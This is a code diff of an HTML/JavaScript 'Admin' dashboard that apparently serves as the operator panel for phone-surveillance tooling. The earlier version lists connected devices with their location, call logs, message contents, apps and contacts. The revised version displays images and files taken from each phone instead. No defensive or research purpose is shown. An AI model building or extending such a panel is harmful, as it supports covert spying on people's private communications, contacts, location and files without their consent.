@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Admin - Full Access</title>
+    <title>Admin - Media</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
@@ -14,36 +14,22 @@
         .header .status{display:flex;align-items:center;gap:10px;font-size:13px;color:#00ff4188}
         .header .status .dot{width:10px;height:10px;border-radius:50%;background:#00ff41;animation:pulse 2s infinite}
         @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
+        .card{background:#0d0d0d;border-radius:12px;padding:16px;margin-bottom:16px;border:1px solid #00ff4122}
+        .card h3{font-size:14px;color:#00ff41;margin-bottom:10px}
+        .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+        .item{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #00ff4111;font-size:12px}
+        .item .label{color:#00ff4188}
+        .item .value{color:#00ff41}
+        .btn{padding:8px 16px;border:none;border-radius:8px;background:#00ff4122;color:#00ff41;font-weight:600;font-size:12px;cursor:pointer;border:1px solid #00ff4133}
+        .btn:hover{background:#00ff4133}
+        .preview-img{max-width:200px;max-height:200px;border-radius:8px;border:1px solid #00ff4133;margin:8px 0}
         .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:20px}
         .stat-card{background:#0d0d0d;padding:14px 18px;border-radius:10px;border:1px solid #00ff4122}
         .stat-card .num{font-size:24px;font-weight:800;color:#00ff41}
         .stat-card .label{font-size:11px;color:#00ff4188}
-        .card{background:#0d0d0d;border-radius:12px;padding:16px;margin-bottom:16px;border:1px solid #00ff4122}
-        .card h3{font-size:14px;color:#00ff41;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center}
-        .card h3 span{color:#00ff4188;font-size:11px;font-weight:400}
-        .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
-        .item{display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid #00ff4111;font-size:12px}
-        .item:last-child{border-bottom:none}
-        .item .label{color:#00ff4188}
-        .item .value{color:#00ff41;font-weight:500}
-        .item .value.incoming{color:#00ff41}
-        .item .value.outgoing{color:#00ffcc}
-        .item .value.missed{color:#ff4444}
-        .btn{width:100%;padding:10px;border:none;border-radius:8px;background:#00ff4122;color:#00ff41;font-weight:600;font-size:12px;cursor:pointer;border:1px solid #00ff4133;font-family:'Courier New',monospace}
-        .btn:hover{background:#00ff4133}
-        .client-card{background:#0d0d0d;border-radius:12px;padding:14px;border:1px solid #00ff4133;margin-bottom:10px}
-        .client-card .top{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px}
-        .client-card .client-name{font-size:15px;font-weight:700;color:#00ff41}
-        .client-card .client-id{color:#00ff4188;font-size:11px}
-        .status-badge{padding:3px 10px;border-radius:20px;font-size:10px;font-weight:600}
-        .status-badge.online{background:#00ff4122;color:#00ff41;border:1px solid #00ff41}
-        .status-badge.offline{background:#ff444422;color:#ff4444;border:1px solid #ff4444}
         .logs{background:#000a00;padding:10px;border-radius:8px;border:1px solid #00ff4122;max-height:150px;overflow-y:auto;font-size:11px;color:#00ff4188;margin-top:10px}
         .logs .log-entry{color:#00ff41;padding:2px 0}
-        .refresh-btn{padding:4px 14px;border:none;border-radius:8px;background:#00ff4122;color:#00ff41;cursor:pointer;border:1px solid #00ff4133;font-family:'Courier New',monospace;font-size:11px}
-        .refresh-btn:hover{background:#00ff4133}
-        .full-data{font-size:11px;color:#00ff4188;margin-top:4px}
-
+        .refresh-btn{padding:4px 14px;border:none;border-radius:8px;background:#00ff4122;color:#00ff41;cursor:pointer;border:1px solid #00ff4133;font-size:11px}
         @media(max-width:768px){.grid-2{grid-template-columns:1fr}}
     </style>
 </head>
@@ -52,213 +38,113 @@
 <div class="container">
 
     <div class="header">
-        <div><h1>⬛ ADMIN - FULL ACCESS</h1><div style="font-size:11px;color:#00ff4188;">🔓 Real-time Phone Data</div></div>
+        <div><h1>📸 ADMIN - MEDIA</h1><div style="font-size:11px;color:#00ff4188;">Phone Media & Files</div></div>
         <div class="status">
             <span class="dot"></span>
-            <span id="liveStatus">🟢 Live</span>
+            <span>Live</span>
             <span style="color:#00ff4188;margin-left:10px;font-size:11px;" id="lastUpdate">Updated: Just now</span>
-            <button class="refresh-btn" onclick="refreshDashboard()">🔄 Refresh</button>
+            <button class="refresh-btn" onclick="refreshData()">🔄</button>
         </div>
     </div>
 
     <div class="stats-grid">
         <div class="stat-card"><div class="num" id="totalDevices">0</div><div class="label">📱 Devices</div></div>
-        <div class="stat-card"><div class="num" id="totalCalls">0</div><div class="label">📞 Calls</div></div>
-        <div class="stat-card"><div class="num" id="totalMsgs">0</div><div class="label">💬 Messages</div></div>
-        <div class="stat-card"><div class="num" id="totalApps">0</div><div class="label">📲 Apps</div></div>
-        <div class="stat-card"><div class="num" id="totalContacts">0</div><div class="label">📇 Contacts</div></div>
+        <div class="stat-card"><div class="num" id="totalImages">0</div><div class="label">🖼️ Images</div></div>
+        <div class="stat-card"><div class="num" id="totalFiles">0</div><div class="label">📁 Files</div></div>
     </div>
 
-    <div class="card">
-        <h3>📱 Connected Devices <span id="deviceCount">(0)</span></h3>
-        <div id="clientsList"><div style="color:#00ff4188;text-align:center;padding:20px;font-size:13px;">⏳ Waiting for data...</div></div>
+    <div id="mediaContainer">
+        <div style="color:#00ff4188;text-align:center;padding:40px;font-size:13px;">⏳ Waiting for media data...</div>
     </div>
 
-    <div class="grid-2">
-        <div class="card">
-            <h3>📞 Calls <span id="callCount">(0)</span></h3>
-            <div id="callsList"><div style="color:#00ff4188;font-size:12px;">No calls yet</div></div>
-        </div>
-        <div class="card">
-            <h3>💬 Messages <span id="msgCount">(0)</span></h3>
-            <div id="messagesList"><div style="color:#00ff4188;font-size:12px;">No messages yet</div></div>
-        </div>
-    </div>
-
-    <div class="card">
-        <h3>📲 Apps <span id="appCount">(0)</span></h3>
-        <div id="appsList"><div style="color:#00ff4188;font-size:12px;">No apps data</div></div>
-    </div>
-
-    <div class="card">
-        <h3>📇 Contacts <span id="contactCount">(0)</span></h3>
-        <div id="contactsList"><div style="color:#00ff4188;font-size:12px;">No contacts yet</div></div>
-    </div>
-
-    <div class="card">
-        <h3>📋 Activity Logs</h3>
-        <div class="logs" id="logs">
-            <div class="log-entry">[System] Full access dashboard ready</div>
-        </div>
+    <div class="logs" id="logs">
+        <div class="log-entry">[System] Media dashboard ready</div>
     </div>
 
 </div>
 
 <script>
     // ==========================================
-    // 🔥 ADMIN - FULL ACCESS DASHBOARD
+    // 🔥 ADMIN - MEDIA DASHBOARD
     // ==========================================
 
-    let devices = {};
+    let mediaData = {};
 
     function loadData() {
         try {
-            const raw = localStorage.getItem('phone_data');
+            const raw = localStorage.getItem('phone_media');
             if (raw) {
-                devices = JSON.parse(raw);
-                renderDashboard();
-                addLog('📊 Data loaded: ' + Object.keys(devices).length + ' devices');
+                mediaData = JSON.parse(raw);
+                renderMedia();
+                updateStats();
+                addLog('📊 Media data loaded: ' + Object.keys(mediaData).length + ' devices');
             } else {
-                addLog('⏳ Waiting for client data...');
+                addLog('⏳ Waiting for media data...');
             }
         } catch(e) { console.log('Load error:', e); }
-        updateStats();
     }
 
-    function renderDashboard() {
-        const deviceIds = Object.keys(devices);
+    function renderMedia() {
+        const container = document.getElementById('mediaContainer');
+        const deviceIds = Object.keys(mediaData);
+
         if (deviceIds.length === 0) {
-            document.getElementById('clientsList').innerHTML = '<div style="color:#00ff4188;text-align:center;padding:20px;font-size:13px;">⏳ No devices connected yet</div>';
+            container.innerHTML = '<div style="color:#00ff4188;text-align:center;padding:40px;font-size:13px;">⏳ No media data yet</div>';
             return;
         }
 
-        let clientsHtml = '';
-        let allCalls = [], allMessages = [], allApps = [], allContacts = [];
-
+        let html = '';
         deviceIds.forEach(id => {
-            const d = devices[id];
+            const d = mediaData[id];
             const lastUpdate = d.lastUpdate ? new Date(d.lastUpdate).toLocaleTimeString() : 'Never';
             const isOnline = d.lastUpdate && (Date.now() - new Date(d.lastUpdate).getTime() < 60000);
 
-            clientsHtml += `
-                <div class="client-card">
-                    <div class="top">
-                        <div>
-                            <div class="client-name">📱 ${id}</div>
-                            <div class="client-id">Last active: ${lastUpdate}</div>
+            html += `
+                <div class="card">
+                    <h3>📱 ${id} <span style="font-size:11px;color:#00ff4188;">${isOnline ? '🟢 Online' : '🔴 Offline'} • ${lastUpdate}</span></h3>
+                    ${d.image ? `<div><img src="${d.image}" class="preview-img"></div>` : ''}
+                    ${d.files && d.files.length > 0 ? `
+                        <div style="margin-top:8px;">
+                            <div style="font-size:12px;color:#00ff4188;">📁 ${d.files.length} files</div>
+                            ${d.files.slice(0, 5).map(f => `
+                                <div class="item"><span class="label">${f.name}</span><span class="value">${Math.round(f.size/1024)} KB</span></div>
+                            `).join('')}
+                            ${d.files.length > 5 ? `<div style="color:#00ff4188;font-size:11px;">+ ${d.files.length - 5} more files</div>` : ''}
                         </div>
-                        <span class="status-badge ${isOnline ? 'online' : 'offline'}">${isOnline ? '🟢 Online' : '🔴 Offline'}</span>
-                    </div>
-                    <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;margin-top:8px;font-size:11px;">
-                        ${d.location ? `<div><span style="color:#00ff4188;">📍</span> <span style="color:#00ff41;">${d.location.lat || 'N/A'}</span></div>` : ''}
-                        ${d.battery ? `<div><span style="color:#00ff4188;">🔋</span> <span style="color:#00ff41;">${d.battery.level || 'N/A'}</span></div>` : ''}
-                        ${d.network ? `<div><span style="color:#00ff4188;">📶</span> <span style="color:#00ff41;">${d.network.type || 'N/A'}</span></div>` : ''}
-                    </div>
-                    <div class="full-data">
-                        📞 ${d.calls ? d.calls.length : 0} | 💬 ${d.messages ? d.messages.length : 0} | 📲 ${d.apps ? d.apps.length : 0} | 📇 ${d.contacts ? d.contacts.length : 0}
-                    </div>
+                    ` : ''}
+                    <div style="font-size:11px;color:#00ff4188;margin-top:6px;">📤 Sent: ${d.timestamp ? new Date(d.timestamp).toLocaleString() : 'N/A'}</div>
                 </div>
             `;
-
-            if (d.calls) allCalls = allCalls.concat(d.calls);
-            if (d.messages) allMessages = allMessages.concat(d.messages);
-            if (d.apps) allApps = allApps.concat(d.apps);
-            if (d.contacts) allContacts = allContacts.concat(d.contacts);
         });
 
-        document.getElementById('clientsList').innerHTML = clientsHtml;
-        document.getElementById('deviceCount').textContent = '(' + deviceIds.length + ')';
+        container.innerHTML = html;
         document.getElementById('totalDevices').textContent = deviceIds.length;
-
-        renderCalls(allCalls);
-        renderMessages(allMessages);
-        renderApps(allApps);
-        renderContacts(allContacts);
-        updateStats();
-    }
-
-    function renderCalls(calls) {
-        const container = document.getElementById('callsList');
-        if (!calls || calls.length === 0) { container.innerHTML = '<div style="color:#00ff4188;font-size:12px;">No calls yet</div>'; return; }
-        document.getElementById('callCount').textContent = '(' + calls.length + ')';
-        container.innerHTML = calls.slice(0, 10).map(c => `
-            <div class="item">
-                <span class="label">${c.number || 'Unknown'}</span>
-                <span class="value ${c.type || 'incoming'}">● ${c.type || 'incoming'}</span>
-                <span style="color:#00ff4188;font-size:10px;">${c.duration || '0s'}</span>
-            </div>
-        `).join('');
-        document.getElementById('totalCalls').textContent = calls.length;
-    }
-
-    function renderMessages(messages) {
-        const container = document.getElementById('messagesList');
-        if (!messages || messages.length === 0) { container.innerHTML = '<div style="color:#00ff4188;font-size:12px;">No messages yet</div>'; return; }
-        document.getElementById('msgCount').textContent = '(' + messages.length + ')';
-        container.innerHTML = messages.slice(0, 10).map(m => `
-            <div class="item">
-                <span class="label">${m.sender || 'Unknown'}</span>
-                <span class="value">${m.message || ''}</span>
-                <span style="color:#00ff4188;font-size:10px;">${m.time || ''}</span>
-            </div>
-        `).join('');
-        document.getElementById('totalMsgs').textContent = messages.length;
-    }
-
-    function renderApps(apps) {
-        const container = document.getElementById('appsList');
-        if (!apps || apps.length === 0) { container.innerHTML = '<div style="color:#00ff4188;font-size:12px;">No apps data</div>'; return; }
-        document.getElementById('appCount').textContent = '(' + apps.length + ')';
-        container.innerHTML = apps.slice(0, 10).map(a => `
-            <div class="item">
-                <span class="label">${a.icon || '📱'} ${a.name || 'Unknown'}</span>
-                <span class="value" style="color:${a.active ? '#00ff41' : '#00ff4188'};">${a.active ? '●' : '○'} ${a.time || '0m'}</span>
-            </div>
-        `).join('');
-        document.getElementById('totalApps').textContent = apps.filter(a => a.active).length;
-    }
-
-    function renderContacts(contacts) {
-        const container = document.getElementById('contactsList');
-        if (!contacts || contacts.length === 0) { container.innerHTML = '<div style="color:#00ff4188;font-size:12px;">No contacts yet</div>'; return; }
-        document.getElementById('contactCount').textContent = '(' + contacts.length + ')';
-        container.innerHTML = contacts.slice(0, 10).map(c => `
-            <div class="item">
-                <span class="label">${c.name || 'Unknown'}</span>
-                <span class="value">${c.tel || 'N/A'}</span>
-            </div>
-        `).join('');
-        document.getElementById('totalContacts').textContent = contacts.length;
     }
 
     function updateStats() {
-        const deviceIds = Object.keys(devices);
-        let totalCalls = 0, totalMsgs = 0, totalApps = 0, totalContacts = 0;
+        const deviceIds = Object.keys(mediaData);
+        let totalImages = 0, totalFiles = 0;
         deviceIds.forEach(id => {
-            const d = devices[id];
-            if (d.calls) totalCalls += d.calls.length;
-            if (d.messages) totalMsgs += d.messages.length;
-            if (d.apps) totalApps += d.apps.filter(a => a.active).length;
-            if (d.contacts) totalContacts += d.contacts.length;
+            const d = mediaData[id];
+            if (d.image) totalImages++;
+            if (d.files) totalFiles += d.files.length;
         });
-        document.getElementById('totalCalls').textContent = totalCalls;
-        document.getElementById('totalMsgs').textContent = totalMsgs;
-        document.getElementById('totalApps').textContent = totalApps;
-        document.getElementById('totalContacts').textContent = totalContacts;
+        document.getElementById('totalImages').textContent = totalImages;
+        document.getElementById('totalFiles').textContent = totalFiles;
     }
 
-    function refreshDashboard() {
+    function refreshData() {
         loadData();
         document.getElementById('lastUpdate').textContent = 'Updated: ' + new Date().toLocaleTimeString();
         addLog('🔄 Dashboard refreshed');
     }
 
-    function addLog(message) {
+    function addLog(msg) {
         const logs = document.getElementById('logs');
         const time = new Date().toLocaleTimeString();
         const entry = document.createElement('div');
         entry.className = 'log-entry';
-        entry.textContent = `[${time}] ${message}`;
+        entry.textContent = `[${time}] ${msg}`;
         logs.appendChild(entry);
         logs.scrollTop = logs.scrollHeight;
         if (logs.children.length > 20) logs.removeChild(logs.children[0]);
@@ -268,11 +154,11 @@
 
     function init() {
         loadData();
-        addLog('🟢 Full access dashboard ready');
-        console.log('⬛ Admin - Full Access Loaded');
+        addLog('🟢 Media dashboard ready');
+        console.log('📸 Admin - Media Loaded');
     }
 
-    window.refreshDashboard = refreshDashboard;
+    window.refreshData = refreshData;
     init();
 </script>
 </body>
